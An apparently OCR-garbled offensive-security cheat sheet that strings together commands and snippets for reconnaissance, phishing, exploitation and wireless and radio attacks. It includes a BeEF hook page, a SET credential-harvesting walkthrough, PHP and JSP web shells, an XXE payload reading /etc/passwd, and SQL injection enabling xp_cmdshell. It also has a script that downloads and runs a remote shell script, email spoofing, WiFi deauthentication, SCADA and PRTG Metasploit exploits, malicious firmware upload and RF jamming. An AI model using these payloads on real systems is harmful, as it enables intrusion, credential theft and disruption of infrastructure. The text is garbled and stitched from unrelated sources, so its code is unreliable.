python rsf.py -m discovery




python rsf.py -m vulnerability




python rsf.py -m bruteforce




python rsf.py -m exploit




python rsf.py -m payloads




python rsf.py -m sniffer




python rsf.py -m dos




python rsf.py -m password
python rsf.py -m shodan
!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
html
head.
title Campaign Title· /title
script
var commandModuleStr = ' script src= "' + window.location.protocol +
'//' + window. location. host + ':8080/hook.js"
type="text/javascript" \/script.';
document.write(commandModuleStr);
//Site refresh=window.setTimeout(function() {window.location.href='http://ww
w.google.com/'},20000);
/script
/head
frameset rows="*,1px"
frame src="http://www.google.com/" frameborder=O
noresize="noresize" /
frame src="/e" frarneborder=O scrolling=no noresize=noresize /
/frameset
/html




applet archive="legit.jar" code="This is a legit applet" width="1"
height="1"
/applet




iframe src="http://1.1.1.1" width="0" height="0" frameborder="0"
tabindex="-1" title="empty" style="visibility:hidden;display:none"
/iframe
ASCII - Base64 javascript:btoa("ascii str")
Base64 - ASCII javascript:atob("base64==")
ASCII - URI javascript:encodeURI(" script "}
URI - ASCII javascript:decodeURI("%3cscript%3E")




wget -q --save-cookies=cookie.txt --keep-session-cookies --post-
data="username: admin&password=pass&Login=Login" http://url/login. php




curl -I -X HEAD -A "Mozilla/5.0 (compatible; MSIE 7.01; Windows NT 5.0)"
http:// ip




curl -u user:pass -o outfile https://login.bob.com




curl ftp://user:pass@bob.com/directory/




curl http://bob.com/file[l-10].txt
The steps below will clone a website and redirect after 3 seconds to
another page requiring basic authentication. It has proven very useful for
Collecting credentials during social engineering engagements.

1. Start Social Engineering Toolkit (SET)
     /pentest/exploits/set/./set
2. Through SET, use the 'Website Attack Vector' menu to clone yours
     preferred website. 'Do not close SET'
3. In a new terminal create a new directory (lowercase L)
     mkdir /var/www/1
4. Browse to SET directory and copy the cloned site
     cd /pentest/exploits/set/src/web clone/site/template/
     cp index.html /var/www/index.html
     cp index.html /var/www/1/index.html
5. Open /var/www/index.html and add tag between head tags
     meta http-equiv="refresh"
content="3;url=http:// domainlip /1/index.html"/
6. Create blank password file to be used for basic auth
     touch /etc/apache2/.htpasswd
7. Open /etc/apache2/sites-available/default and add:
     Directory /var/www/1
         AuthType Basic
         AuthName "PORTAL LOGIN BANNER"
         AuthUserFile /etc/apache2/.htpasswd
         Require user test
     /Directory
8. Start Apache2
     /etc/init.d/apache2 start
9. Start Wireshark and add the filter:
     http.authbasic
10. Send the following link to your target users
     http://domainlip/index.html




Install dependencies:
     wget http://wkhtmltopdf.googlecode.com/files/wkhtmltoimage-0.11.0 rc1-
     static-i386.tar.bz2
     tar -jxvf wkhtmltoimage-0.11.0 rc1-statlc-i386.tar.bz2
     cp wkhtmltoimage-i386 /usr/local/bin/

Install Nmap module:
     git clone git://github.com/SpiderLabs/Nmap-Tools.git
     cd Nmap-Tools/NSE/
     cp http-screenshot.nse /usr/local/share/nmap/scripts/
     nmap --script-updatedb

OS/version detection using screenshot script (screenshots saved as .png):
     nmap -A -script=http-screenshot -p80,443 1.1.1.0/24 -oA nmap-
     screengrab

Script will generate HTML preview page with all screenshots:
#!/bin/bash
printf "HTHL.- BODY BR"
preview.html
ls -1 '.png I awk -F : ' {print $1":"$2"\n BR- IMG SRC=\""$1"%3A"$2"\"
width=400 BR BR ")' preview. html
printf " /BODY /HTML. " preview. html




Installation Dependencies:
Download Phantomjs
     https://phantomjs.googlecode.com/files/phantomjs-1.9.2-linux-x86_64.tar.bz2
Download PeepingTom
     git clone https://bitbucket.org/LaNMaSteR53/peepingtom.git
Extract and copy phantomjs from phantomjs-1.9.2-linux-x86 64.tar.bz2 and
copy to peepingtom directory
Run PeepingTom
     python peepingtom.py http:// mytarget.com




wfuzz -c -z file,/usr/share/wfuzz/wordlist/Injections/XSS.txt -hc 404 https://www.example




wfuzz -w /usr/share/wordlists/big.txt -u http://admirer.htb/admin/FUZZ.FUZ2Z -z list,txt-
    wfuzz -X POST -u ''http://quick.htb/login.php' -w elist.txt -d 'email=FUZZ&password=12345




    ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10




    gobuster dns -t 50 -d pubg.com -w ~/seclists/Dir/subdomains.dat




    ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://
    example.com/ -H "Host: FUZZ.example.com"




    https://crt.sh/



‫و‬


    assetfinder --subs-only <domain> | httprobe




    giftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' me.jpg
java -jar ysoserial.jar CommonsBeanutils1 'COMMAND' | base64 -w0




https://github.com/TheBinitGhimire/Web-Shells




./git-dumper.py http://example.com/.git/ example.com




./extractor.sh /tmp/mygitrepo /tmp/mygitrepodump




1- find structure
python2.7 ds_store_exp.py http://poo.htb/.DS_Store
2-enum in found path
java -jar iis_shortname_scanner.jar 2 20 http://poo.htb/dev/dca66d38fd916317687e1390a420c




python3 paramspider.py --domain bugcrowd.com --exclude woff,css,js,png,svg,php,jpg --outp
gf xss domain.txt
gf potential domain.txt




jwt-cracker "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6Ikp

Or




docker run --rm -it portswigger/sig2n <token1> <token2>




giftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' meme.jpg




<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>




<? xml\ version = "1.0"\ encoding = "UTF − 8"? >
< ! DOCTYPE\ abc\ [
< ! ENTITY\ ab\ SYSTEM\ "file:///etc/passwd" >
] >
< root >< name > &ab; </name >< tel > demo </tel >< email > demo@demo. com </email >< pas
/       d   /   t




SELECT TOP 1 TABLE_NAME FROM INFORMATION SCHEMA.TABLES




SELECT name FROM Syscolumns WHERE id
(SELECT id FROM Sysobjects WHERE
name='mytable')
SELECT name, password hash FROM master.sys.sgl_logins




execute('execute(''alter role [db_owner] add member [client]'') at "compatibility\poo_pub




SELECT relname, A.attname FROM pg_class C, pg_namespace N, pg_attribute A,
pg_type T WHERE (C.relkind='r') AND (N.oid=C.relnamespace) AND
(A.attrelid=C.oid) AND (A.atttjpid=T.oid) AND (A.attnum 0) AND (NOT
A.attisdropped) AND (N.nspname ILIKE 'public')




SELECT c.relname FROM pg_catalog.pg_class c LEFT JOIN
pg catalog.pg namespace n ON n.oid = c.relnamespace WHERE c.relkind IN
( 'r',") AND n.nspname NOT IN ( 'pg catalog', 'pg toast') AND
pg_catalog.pg_table_is_visible(c.oid)
SELECT table schema, table name, column_name FR0M
information scherna.columns WHERE
table schema != 'mysql' AND table schema != 'information schema'




osql -S ip , port -U sa -P pwd -Q "exec xp cmdshell `net user /add user
passr




UNION ALL SELECT LOAD FILE( '/etc/passwd');




SELECT * FROM mytable INTO dumpfile '/tmp/somefile';
SELECT DISTINCT grantee FROM dba_sys_privs WHERE ADMIN_OPTION = 'YES';




import socket as sk
for port in range (1, 1024):
     try:
          s=sk. socket (sk. AF _ INET, sk. SOCK_ STREAM)
          s.settimeout(1000)
          s. connect ( (' 127. 0. 0. 1 ' , port) )
          print '%d:OPEN' % (port)
          s.close
     except: continue
#!/usr/bin/pjthon
import base64
filel=open("pwd.lst","r")
file2=open("b64pwds.lst","w")
for line in file1:
     clear= "administrator:"+ str.strip(line)
     new= base64.encodestring(clear)
     file2.write(new)




import binascii, sys, string
dataFormatHex = binascii.a2b_hex(sys.argv[1])
output = ""
for char in dataFormatEx:
     if char in string.printable: output += char
     else: output += "."
print ''\n'' + output




import glob, re
for msg in glob.glob('/tmp/.txt'):
     filer = open((msg), 'r')
     data = file.read()
     message= re.findall(r' message (.'?) /message ', data, re.DOTALL)
     print "File %s contains %s" % (str(msg), message)
     fi1er.c1ose()




# Create SSL cert (follow prompts for customization)
   openssl req -new -x509 -keyout cert.pem -out cert.pern -days 365 -nodes

#Create httpserver.pj
   import BaseHTTPServer, SimpleHTTPServer, ssl

cert="cert.pem"
httpd = BaseHTTPServer.HTTPServer( ('192.168.1.10' ,443),
Simp1eHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap socket(httpd.socket,certflle=cert,server side=True)
httpd.serve_forever()
python -m SimpleHTTPServer 8080




#!/usr/bin/python
import smtplib, string
import os, time

os.system("/etc/init.d/sendmail start")
time.sleep(4)

    HOST = "localhost"
    SUBJECT = "Email from spoofed sender"
    TO = "target@you.com"
    FROM= "spoof@spoof.com"
    TEXT = "Message Body"
    BODY = string.join( (
            "From: %s" % FROH,
            "To: %s" % TO,
            "Subject: %s" % SUBJECT ,
            "",
            TEXT
            ) , "\r\n")
server = smtplib.SMTP(HOST)
server.sendmail(FROM, [TO], BODY)
server. quit ()
time.sleep(4)
os.system("/etc/init.d/sendmail stop")




#!/usr/bin/python
import urllib2, os

urls = [ "1 1.1.1.1","2.2.2.2"]
port = "80"
payload = "cb.sh"

for url in urls:
    u = "http://%s:%s/%s" % (url, port, payload)
    try:
         r = urllib2.urlopen(u)
         wfile = open{"/tmp/cb.sh", "wb")
        wfile.write(r.read())
        wfile. close ()
        break
    except: continue

if os.path.exists("/tmp/cb.sh"):
    os.system("chmod 700 /tmp/cb.sh")
    os. system ( "/tmp/cb. sh")




#!/usr/bin/python
import urllib2, sys, time

from optparse import OptionParser

parser = OptionParser()
parser.add option{''-t'', dest=''iprange'', help=''target IP range, i.e.
192.168.1.1-25")
parser.add option(''-p'', dest=''port'',default=''80'',help=''port, default=BO'')
parser.add=option("-d", dest="delay",default=".5",help="delay (in seconds),
default=.5 seconds")

(opts, args) = parser.parse_args()

if opts.iprange is None:
     parser.error("you must supply an IP range")

ips = []
headers={}

octets= opts.iprange.split(' .')

start= octets[3] .split('-') [0]
stop = octets [3]. split ( '-' ) [ 1 ]

for i in range(int(start),int(stop)+1):
     ips.append('%s.%s.%s.%d' % (octets[O],octets[1] ,octets[2],i))
print '\nScanning IPs: %s\n' % (ips)

for ip in ips:
     try:
         response= urllib2.urlopen('http://%s:%s' % (ip,opts.port))
         headers[ip] = dict(response.info())
     except Exception as e:
         headers[ip] = "Error: " + str(e)
time.sleep(float(opts.delay))

for header in headers:
     try:
         print '%s : %s' % (header,headers[header] .get('server'))
     except:
         print '%s : %s' % (header,headers[header])
sr ( IPv6 ( src=" ipv6 ", dst="ipv6")/ ICMP ())




ip=IP(src="ip", dst="ip")
u=UDP(dport=1234, sport=5678)
pay = "my UDP packet"
packet=ip/u/pay
packet.show()
wrpcap ("out.pcap",packet):write to pcap
send(packet)




packet=IP(src="ip" ,dst="ip")/UDP(dport=l23)/fuzz(NTP(version=4,mode=4))




from scapy.all import *
# Add iptables rule to block attack box from sending RSTs
# Create web.txt with entire GET/POST packet data
fileweb = open("web.txt",'r')
data = fileweb.read()
ip = IP(dst="ip")
SYN=ip/TCP(rport=RandNum(6000,7000),dport=BO,flags="S",seq=4)
SYNACK = sr1(SYN)
ACK=ip/TCP(sport=SYNACK.dport,dport=BO,flags="A",seq=SYNACK.ack,ack=SYNACK.
seq+l)/data
reply, error = sr(ACK)
print reply.show()
use strictly; use IO::Socket;
for($port=0;$port 65535;$port++) {
$remote=IO::Socket::INET-new(
Proto= "tcp",PeerAddr= "127.0.0.1",PeerPort= $port);
if($remote) {print "$port is open\n"); )
#!/bin/bash
RESULT=0
while [ $RESULT -eq 0 ]
do
PASSWORD="PASSWORD"
ZIPFILE="$( ls *.zip )"
unzip -P "$PASSWORD" "$ZIPFILE"
RESULT=$?
echo "Unzipped $ZIPFILE using password $PASSWORD ($RESULT)"
cd flag
done
https://apps.fcc.gov/oetcf/eas/reports/GenericSearch.cfm




http://www.radioreference.com/apps/db/
iwconfig ath0 essid $SSID
ifconfig ath0 up
dhclient ath0




iwconfig ath0 essid $SSID key
ifconfig ath0 up
dhclient ath0
iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa_supplicant -B -i ath0 -c wpa-psk.conf
dhclient ath0




iwconfig ath0 essid $SSID
ifconfig ath0 up
wpa supplicant -B -i ath0 -c wpa-ent.conf
dhclient ath0




airmon-ng stop ath0
airmon-ng start wifi0
iwconfig ath0 channel $CH
airdump-ng -c $CH --bssid $AP -w file athO #Capture traffic
aireplay-ng -0 10 -a $AP -c $CH athO #Force client de-auth




aircrack-ng -w wordlist capture.cap # WPA-PSK
asleep -r capture.cap -w dict.asleep # LEAP
eapmd5pass -r capture.cap -w wordlist # EAP-HDS




mdk3 int a -a $AP #Auth Flood
mdk3 int b -c $CH #Beacon Flood




jd-gui




https://problemkaputt.de/no$gba.zip
https://mgba.io/downloads.html
https://github.com/SiD3W4y/GhidraGBA




file <filename>
cat password | xor 0xff > password.bin




https://asecuritysite.com/encryption/ferdecode




from cryptography.fernet import Fernet
key = ""
token = ""
cipher = Fernet(key)
decoded = cipher.decrypt(token)
http://www.malbolge.doleczek.pl/
https://zb3.me/malbolge-tools/




https://www.geocachingtoolbox.com/index.php?lang=en&page=dvorakKeyboard




http://dl.djsoft.net/DTMFChecker.zip
https://www.dcode.fr/prime-numbers-cipher




git clone https://github.com/BREAKTEAM/Debcrypt.git
python3 crack.py




https://www.dcode.fr/cistercian-numbers




https://www.dcode.fr/code-multitap-abc
http://rumkin.com/tools/cipher/atbash.php




python3 crack_repeating_key_xor.py -f <file> -x
https://programtalk.com/vs2/python/9053/featherduster/tests/test_bleichenbacher.py/




python3 ./RsaCtfTool/RsaCtfTool.py --publickey ./key.pub --private
openssl rsautl -decrypt -inkey key.pri -in flag.enc -out flag.txt




https://www.dcode.fr/vigenere-cipher




echo "YToxOntzOjQ6Im5hbWUiO2E6MTp7czoxMDoicGF1bC1jb2xlcyI7YTo5OntzOjI6ImlkIjtzOjEwOiIxNTk
steghide info <filename> -p <password>
steghide extract -sf <filename> -p <password>




java -jar turgen.jar




https://www.dcode.fr/binary-image
https://online-barcode-reader.inliteresarchy.com/




java -jar Stegsolve.jar




binwalk -e <file>
strings <file>




./steg_brute.py -b -d /usr/share/wordlists/rockyou.txt -f ../meow.wav
docker exec -it --privileged <container_name> /bin/bash




ssh -i <path_to_key> <username>@<ip_address>




ssh -L <local_port>:<remote_host>:<remote_port> <username>@<ip_address>
kubectl create clusterrolebinding privileged-role --clusterrole=cluster-admin --serviceac




stage('Build') {
  steps {
    sh 'sudo <command>'
  }
}




aws sts assume-role --role-arn <role-arn> --role-session-name <session-name>
# Example 1: Using SUDO to escalate privileges

sudo /bin/bash

# Example 2: Exploiting a misconfigured SUID binary

chmod u+s /usr/bin/newuid
/usr/bin/newuid

# Example 3: Using a kernel exploit to escalate privileges

./exploit




python cloudflair.py -d example.com




cloudmapper collect --account example_account
python GCPBucketBrute.py -d example.com -p projects.txt -n




nmap -p 80,443,8080 example.com




python inspy.py -d example.com




python3 cloudenum.py -u example.com




aws ec2 describe-instances




aws ec2 run-instances --image-id ami-0c55b159cbfafe1f0 --count 1 --instance-type t2.micro




aws s3 mb s3://my-bucket-name




gcloud compute instances list
gcloud compute instances create example-instance --machine-type=n1-standard-1 --image-pro




gsutil mb -p my-project-id gs://my-bucket-name




az vm list -g my-resource-group




az vm create --resource-group my-resource-group --name my-vm --image UbuntuLTS --admin-us




az storage account create --name mystorageaccount --resource-group myresourcegroup --loca




aws s3api get-bucket-acl --bucket [bucket-name]




aws s3api get-bucket-logging --bucket [bucket-name]
aws s3api get-bucket-encryption --bucket [bucket-name]




aws iam list-users and aws iam list-roles




aws iam list-access-keys --user-name [user-name]




aws iam get-policy --policy-arn [policy-arn]




aws ec2 describe-security-groups --group-id [security-group-id]




aws ec2 describe-security-groups --filters Name=ip-permission.protocol,Values=all Name=ip




aws ec2 describe-security-groups --filters Name=ip-permission.protocol,Values=tcp Name=ip
 aws ec2 describe-vpcs




 aws ec2 describe-vpc-peering-connections --filters Name=status-code,Values=active Name=re




Social media



Caller ID spoofing



Phishing emails



Pretexting kits
Subject: Urgent: Security Alert
Body:
Dear [Target],

We have detected suspicious activity on your account and need to verify your information

Thank you for your cooperation.

Sincerely,
[Legitimate-Sounding Sender Name]```

Remember to replace the [Spoofed Email Address], [Target], [Malicious Link], and [Legitim




./gophish




setoolkit --campaign=spearphish




setoolkit --campaign=webattack




setoolkit --campaign=credential_harvester




setoolkit --campaign=smsSpoofing
beef-xss




beef -c /path/to/config.yaml




beef -p 8080




evilginx templates




evilginx domain add [domain_name]




evilginx domain delete [domain_name]:




evilginx log
evilginx test [phishing_template] [email_address]
import RPi.GPIO as GPIO
import time

# Set up the Raspberry Pi to control a motor
GPIO.setmode(GPIO.BOARD)
GPIO.setup(7, GPIO.OUT)
motor = GPIO.PWM(7, 50)

# Define the function to open the door
def open_door():
    motor.start(7.5)
    time.sleep(1)
    motor.stop()

# Define the function to close the door
def close_door():
    motor.start(2.5)
    time.sleep(1)
    motor.stop()

# Main program
while True:
    authorized_person = input("Please swipe your access card: ")
    if is_authorized(authorized_person):
        open_door()
        time.sleep(5)
        close_door()
    else:
        print("Access denied.")
vnc country: [two letter country code]




nmap -p 5900 [target IP address]
nc [target IP address] 5900




vncviewer -autopass [target IP address]:[display number]




use auxiliary/scanner/vnc/vnc_login
set rhosts [target IP address]
set user_file [path to username file]
set pass_file [path to password file]
run




vncrack -P /path/to/password/file.txt -u username -H <IP address> -v <VNC port>




hydra -L usernames.txt -P passwords.txt -s 5900 -f -vV <target_ip> vnc




rdp country: [two letter country code]




nmap -sS -p 3389 [target IP address]
masscan -p3389 192.168.1.0/24 --rate=10000




nc -zv 192.168.1.1 3389




hping3 -S 192.168.1.0/24




unicornscan -mT 192.168.1.0/24:a




hydra -l username -P /path/to/wordlist.txt rdp://targetip




medusa -u username -P /path/to/wordlist.txt -h targetip -M rdp




ncrack -vv --user username -P /path/to/wordlist.txt rdp://targetip




crowbar -b rdp -s targetip/32




rdesktop -u username -p password -g 1024x768 -a 16 x.x.x.x
xfreerdp /u:username /p:password /v:rdp-server




remmina --connect rdp://username:password@rdp-server




vinagre -c "rdp://username:password@rdp-server"




"title:PRTG inurl:/index.htm?tabid=0&sort=Errors&filter_status=-1"




"html:"PRTG Traffic Grapher""




"p443.title: PRTG Traffic Grapher"




"autonomous_system.organization: Paessler AG"




nmap -sn 192.168.1.0/24
nmap -p 80,443,8443 192.168.1.0/24
msfconsole -q
use auxiliary/scanner/http/dir_scanner
set RHOSTS 192.168.1.10
set RPORT 80
set THREADS 5
set PATH /
run




msfconsole -q
use exploit/windows/http/prtg_authenticated_rce
set RHOST 192.168.1.10
set RPORT 80
set LHOST 192.168.1.20
set LPORT 4444
set TARGETURI /
run




nmap -sS -p 1433 -oA outputfile 192.168.1.1/24




hydra -L users.txt -P passwords.txt -vV <target_ip> sql-server




nmap -p 102,502 -sV <target_ip>




"port:502 modbus"
"port:44818"




"port:1911




"port:102




"port:20000"




python3 genieacs.py --list




modscan.py -a <target> -p 502 -t 0 -r 1-100
"modscan.py --ip-address <target IP> --port 502 --unit 1 --function-code 5"




modpoll -m tcp -a 1 -r 1 -c 1 -t 4 -1 192.168.0.10




python3 dnp3-master.py -i eth0 -a <target> -p 20000 -o 3 -c 1 -v




"python enip-exploit.py -i <target IP> -o 3 -v 1"




"bacnet_scan.py -ip <target IP> -p 47808 -d 4194303 -a 1 -t 0"
"python S7comm_payload.py <target IP> 102 --payload 1 --offset 14"




use exploit/windows/scada/s7comm_plus_wincc_opc




use exploit/windows/scada/modbus_write_registers




cat cpub-iexplore-QuickSessionCollection-CmsRdsh.rdp




nmap -Pn -sS -sV <target IP> -p 1-65535




dirb http://<target IP>:<port>/
snmpwalk -c public -v1 <target IP>




curl -X GET http://target.com/
curl -X POST -d "data=example" http://target.com/




wget http://target.com/file




nikto -h target.com




mosquitto_sub -t topic -h broker_address -p port -u username -P password
mosquitto_pub -t topic -h broker_address -p port -m "message" -u username -P password




https://github.com/dustinbrunton/MQTTInspector




python3 coapclient.py -m get -u coap://target.com/resource
filter: coap




sudo python3 -m pip install pyusb
sudo apt-get install libpcap-dev
sudo python3 -m pip install pyserial
sudo python3 -m pip install pycrypto
sudo python3 -m pip install killerbee
kb




filter: zbee




sudo hcitool lescan
sudo hcitool lecc <mac_address>




https://github.com/securing/gattacker




filter: btatt




hydra -L usernames.txt -P passwords.txt ssh://192.168.0.1
medusa -u admin -P /usr/share/wordlists/rockyou.txt -h 192.168.0.1 -M ssh




hydra -L userlist.txt -P passlist.txt -e ns -t 16 telnet://target_IP




sudo bettercap --proxy --sniffer -T 192.168.0.10,192.168.0.20 -X --tcp-proxy




curl -F "file=@malicious_firmware.bin" http://target_device/update




arpspoof -i eth0 -t target_device_ip gateway_ip
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
mitmproxy -p 8080 -T --anticache -s "replace.py malicious_firmware.bin"




python3 firmware_fuzzer.py target_device_ip
use auxiliary/scanner/http/http_jboss_jmx_invoke
set RHOSTS <target IP>
set RPORT 8080
set PAYLOAD java/jsp_shell_reverse_tcp
set LHOST <attacker IP>
set LPORT <attacker port>
exploit




sudo tcpdump -i wlan0 -s 0 -w capture.pcap




sudo bettercap -I wlan0 --proxy
mitmproxy -T --host -R https://target_device.com/ --ssl-insecure -s extract_sensitive_dat




hydra -l admin -P password_list.txt 192.168.1.1 http-post-form "/login.html:user=admin&pa




file <bin>
strings
strings -n5 <bin>
strings -n16 <bin>#longer than 16
strings -tx <bin> #print offsets in hex
binwalk <bin>
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple




binwalk -E <bin>




$ binwalk -ev <bin>
sudo ./emba.sh -f ~/IoTGoat-x86.img.gz -l ~/emba_logs_iotgoat -p ./scan-profiles/default-




sudo python3 ./fat.py IoTGoat-rpi-2.img --qemu 2.5.0




screen /dev/ttyUSB0 115200 (connect to UART interface with baud rate of 115200)
cu -l /dev/ttyUSB0 -s 115200 (connect to UART interface with baud rate of 115200)




OpenOCD -f interface/<interface> -f target/<target> (start OpenOCD using interface and ta
OpenOCD -f interface/<interface> -c "transport select swd" -f target/<target> (start Open
sudo apt-get install gnuradio urh




sudo apt-get install hackrf




Use GNU Radio to capture and replay the signal. Alternatively, use specialized tools like




sudo apt-get install killerbee scapy




Buy or rent a directional antenna from a reputable vendor.




Use tools like GQRX or Inspectrum to analyze frequency hopping patterns.
hackrf_transfer -r filename.bin -f frequency -s sample_rate -g gain




urh --input-file filename.bin --modulation lora --rate [bandwidth] --frequency [frequency




hackrf_transfer -t filename.bin -f frequency -s sample_rate -a 1 -x 40




urh --input-file filename.bin --modulation lora --rate [bandwidth] --frequency [frequency




hackrf_transfer -t noise.bin -f frequency -s sample_rate -a 1 -x 40




urh --modulation lora --rate [bandwidth] --frequency [frequency] --tx --duration [time_in
hackrf_transfer -t filename.bin -f [nearby_frequency] -s sample_rate -a 1 -x 40




urh --modulation lora --rate [bandwidth] --frequency-range [start_frequency] [end_frequen
#include "DigiKeyboard.h"

void setup() {
  // Start the keyboard
  DigiKeyboard.delay(2000); // wait for 2 seconds
  DigiKeyboard.sendKeyStroke(0); // windows key
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("cmd"); // open command prompt
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("echo Hello World!"); // type command
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("exit"); // exit command prompt
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void loop() {
}
#include <SPI.h>
#include <RH_RF69.h>

#define RF69_FREQ 915.0
#define RFM69_CS 10
#define RFM69_INT 2
#define RFM69_RST 9

RH_RF69 rf69(RFM69_CS, RFM69_INT);

void setup() {
  Serial.begin(9600);
  while (!Serial);
  pinMode(RFM69_RST, OUTPUT);
  digitalWrite(RFM69_RST, LOW);
  delay(10);
  digitalWrite(RFM69_RST, HIGH);
  delay(10);
  if (!rf69.init()) {
    Serial.println("RFM69 module initialization failed!");
    while (1);
  }
  rf69.setFrequency(RF69_FREQ);
  Serial.println("RFM69 module initialized successfully!");
}

void loop() {
  uint8_t data[] = "Hello World!";
  rf69.send(data, sizeof(data));
  rf69.waitPacketSent();
  Serial.println("Data sent successfully!");
  delay(1000);
}
#include <RH_RF95.h>

#define RFM95_CS 10
#define RFM95_RST 9
#define RFM95_INT 2

RH_RF95 rf95(RFM95_CS, RFM95_INT);

void setup() {
  pinMode(RFM95_RST, OUTPUT);
  digitalWrite(RFM95_RST, HIGH);
  delay(100);
  digitalWrite(RFM95_RST, LOW);
  delay(10);
  digitalWrite(RFM95_RST, HIGH);
  delay(10);

    if (!rf95.init()) {
      Serial.println("LoRa radio init failed");
      while (1);
    }

    rf95.setFrequency(915.0);
    rf95.setTxPower(23, false);
}
void loop() {
  char radiopacket[20] = "Hello, world!";
  rf95.send((uint8_t *)radiopacket, strlen(radiopacket));
  rf95.waitPacketSent();
  delay(1000);
}




#include <SPI.h>
#include <MFRC522.h>

#define SS_PIN 10
#define RST_PIN 9
MFRC522 rfid(SS_PIN, RST_PIN); // Create instance of the RFID reader module

void setup() {
  Serial.begin(9600); // Initialize serial communication
  SPI.begin(); // Initialize SPI communication
  rfid.PCD_Init(); // Initialize RFID reader module
}

void loop() {
  if (rfid.PICC_IsNewCardPresent() && rfid.PICC_ReadCardSerial()) { // Check if a new RFI
    Serial.print("Tag UID: ");
    for (byte i = 0; i < rfid.uid.size; i++) { // Loop through the tag data and display i
      Serial.print(rfid.uid.uidByte[i] < 0x10 ? "0" : "");
      Serial.print(rfid.uid.uidByte[i], HEX);
    }
    Serial.println();
    rfid.PICC_HaltA(); // Halt the tag and prepare to read a new one
  }
}
#include <Wire.h>
#include <Adafruit_PN532.h>

// Create an instance of the PN532 class
Adafruit_PN532 nfc(PN532_SCK, PN532_MISO, PN532_MOSI, PN532_SS);

void setup(void) {
  Serial.begin(9600);

    // Initialize the PN532 module
    nfc.begin();

    // Configure the module as an NFC reader
    nfc.SAMConfig();
}

void loop(void) {
  uint8_t success;
  uint8_t uid[] = {0, 0, 0, 0, 0, 0, 0};
  uint8_t uidLength;

    // Wait for an NFC tag to be detected
    success = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, uid, &uidLength);

    // If an NFC tag is detected, print its UID
    if (success) {
      Serial.print("UID: ");
      for (uint8_t i = 0; i < uidLength; i++) {
          Serial.print(uid[i], HEX);
        }
        Serial.println("");
    }
}




#include <Wire.h>
#include <Adafruit_PN532.h>

Adafruit_PN532 nfc(PN532_SCK, PN532_MISO, PN532_MOSI, PN532_SS);

void setup(void) {
  Serial.begin(115200);
  while (!Serial) delay(10); // for Leonardo/Micro/Zero

    nfc.begin();

    uint32_t versiondata = nfc.getFirmwareVersion();
    if (!versiondata) {
      Serial.print("PN53x not found");
      while (1); // halt
    }
    Serial.print("Found chip PN5"); Serial.println((versiondata>>24) & 0xFF, HEX);
    Serial.print("Firmware ver. "); Serial.print((versiondata>>16) & 0xFF, DEC);
    Serial.print('.'); Serial.println((versiondata>>8) & 0xFF, DEC);

    nfc.setPassiveActivationRetries(0xFF);

    nfc.SAMConfig();
}

void loop(void) {
  uint8_t success;
     uint8_t uid[] = { 0, 0, 0, 0, 0, 0, 0 }; // Buffer to store the returned UID
     uint8_t uidLength;                        // Length of the UID (4 or 7 bytes depending

     // Wait for an ISO14443A type card (Mifare, etc.). When one is found, 'uid' will be pop
     success = nfc.readPassiveTargetID(PN532_MIFARE_ISO14443A, &uid[0], &uidLength);

     if (success) {
       Serial.println("Found an ISO14443A card");
       Serial.print("UID Length: ");Serial.print(uidLength, DEC);Serial.println(" bytes");
       Serial.print("UID Value: ");
       for (uint8_t i=0; i < uidLength; i++) {
         Serial.print(" 0x");Serial.print(uid[i], HEX);
       }
       Serial.println("");

      uint8_t data[] = { 0x01, 0x23, 0x45, 0x67 };   // Data to write to the tag
      uint8_t dataLength = sizeof(data);
      }
 }




#include <IRremote.h>

int receiver_pin = 11;
IRrecv irrecv(receiver_pin);
decode_results results;
void setup()
{
  Serial.begin(9600);
  irrecv.enableIRIn();
}

void loop()
{
  if (irrecv.decode(&results))
  {
    Serial.println(results.value, HEX);
    irrecv.resume(); // Receive the next value
  }
}
{site}/wp-json/wp/v2/users

{site}/wp-json/wp/v2/posts/?per_page=100&page=1




 cat messages.html | grep -A1 "from_name" | cut -f1 -d "<" | sort -u
 url:t.me cryptocurrency
https://web.archive.org/web/202209/{url}
### Email

-   https://rocketreach.co/browser_extension
-   https://contactout.com/

-   https://app.getprospect.com/303197/contacts/filter/all




### tools:
-   https://github.com/josh0xA/darkdump

-   https://www.maltego.com/transform-hub/image-analyzer/

-   https://github.com/mxrch/GitFive

-   https://github.com/matiash26/Steam-OSINT-TOOL

-   https://github.com/C3n7ral051nt4g3ncy/Masto

-   https://github.com/jordanwildon/Telepathy

-   https://gchq.github.io/CyberChef/

-   https://chrome.google.com/webstore/detail/selection-search/gipnlpdeieaidmmeaichnddnmj

-   https://addons.mozilla.org/en-GB/firefox/addon/selection-search-ff

-   https://inteltechniques.com/tools/

-   https://github.com/novitae/emdofi

-   https://seintpl.github.io/NAMINT/

-   https://github.com/Genymobile/scrcpy

-   https://github.com/novitae/sterraxcyl

-   https://github.com/tejado/telegram-nearby-map

-   https://lnkd.in/f6hqpg6

-   https://cheatography.com/explore/search/?q=Sherlock

-   https://github.com/megadose/holehe

-   https://github.com/mxrch/GHunt
### cctv
-   http://www.insecam.org/en/view/1006815/

-   https://cctv.masspirates.org/

-   https://railwebcams.net/




### certificate
-   https://www.aware-online.com/en/our-customers/



### book
-   Psychology of Intelligence Analysis

-   Visual Intelligence: Sharpen Your Perception, Change Your Life

-   Fixed.: How to Perfect the Fine Art of Problem Solving

-   Introduction to Social Media Investigation: A Hands-on Approach



